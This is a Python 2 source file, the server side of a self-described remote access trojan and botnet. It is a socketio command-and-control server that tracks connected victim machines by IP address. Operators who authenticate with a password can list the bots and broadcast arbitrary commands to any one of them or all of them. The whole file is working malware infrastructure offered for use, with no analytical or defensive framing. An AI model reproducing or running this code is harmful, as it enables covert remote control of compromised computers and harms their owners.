# A Python RAT n' Botnet
#  by Landon in Python2
#    SERVER-SIDE C0DE

import socketio, eventlet, hashlib

def hash(string):
    return hashlib.sha512(
        string.encode('utf-8')
    ).digest()

def deleteByVal(dict, val):
    return { # This deletes the authenticated users from the proles list.
        key : value
        for key, value in dict.iteritems()
        if value != val }

password    = hash( raw_input("Password? >") )
socket      = socketio.Server()
proles      = {} # An IP to SID dictionary.
innerParty  = [] # List of Authorized SIDs.

@socket.on('connect')
def connect(id, info):
    proles[info['REMOTE_ADDR']] = id

@socket.on('disconnect')
def disconnect(id):
    global proles
    proles = deleteByVal(proles, id)

# Emits sent from the innerParty.py.
# Adds an IP to the innerParty list using a password.
@socket.on('authenticate')
def authenticate(id, authPassword):
    global proles

    if hash(authPassword) == password:
        print("A party member just authenticated.")
        innerParty.append(id)
        proles = deleteByVal(proles, id)

@socket.on('command')
def command(id, to, command, args):
    if id in innerParty:

        if command == 'list':
            socket.emit('log', "\n".join([x for x in proles]) )

        elif to == 'all':
            socket.emit(command, args)

        else:
            if to in proles:
                socket.emit(command, args, room=proles[to])
            else:
                socket.emit('log', to + " is an unperson.")

if __name__ == '__main__':
    app = socketio.Middleware(socket)
    eventlet.wsgi.server(eventlet.listen(('', 1984)), app)
